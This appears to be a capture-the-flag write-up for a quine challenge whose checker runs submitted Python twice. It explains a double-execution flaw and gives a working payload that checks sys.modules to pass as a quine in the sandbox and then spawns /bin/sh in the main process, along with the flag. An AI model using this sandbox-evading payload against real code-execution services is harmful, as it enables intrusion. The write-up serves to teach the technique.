#Misc 
## Challenge Overview
The provided Python script prompts the user for a quine (a program that prints its own source code).
It verifies the input using an `is_quine` function, which runs the code in an isolated subprocess.
If the check passes, the main script executes the input again using `exec(code)`.
## Vulnerability Analysis
The vulnerability is a double-execution flaw.
The payload is evaluated twice: once in a restricted subprocess and once in the main process.
Because the main process imports `uuid`, we can differentiate between the two environments.
By checking `sys.modules`, the payload acts as a harmless quine during verification and executes commands during the final `exec()`.
## Exploit Payload
```python
_='_=%r;print(_%%_,end="");import sys,os;"uuid" in sys.modules and os.system("/bin/sh")';print(_%_,end="");import sys,os;"uuid" in sys.modules and os.system("/bin/sh")
```

Flag:`BCCTF{1t5_mY_t1m3_t0_sh1n3}`
